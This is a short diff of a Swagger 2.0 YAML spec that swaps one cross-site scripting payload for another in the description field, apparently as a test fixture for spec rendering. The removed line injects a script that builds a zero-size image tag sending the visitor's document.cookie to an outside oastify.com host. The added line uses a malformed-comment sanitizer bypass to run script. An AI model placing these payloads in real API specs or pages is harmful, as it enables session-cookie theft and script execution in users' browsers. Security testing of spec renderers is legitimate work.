@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: Example title
-  description: <script>document.write('<img src="https://bkz269nij4zkde9dyquagp92ftlk9bdz2.oastify.com?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');</script>
+  description: <! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
 paths:
   /:
     get:
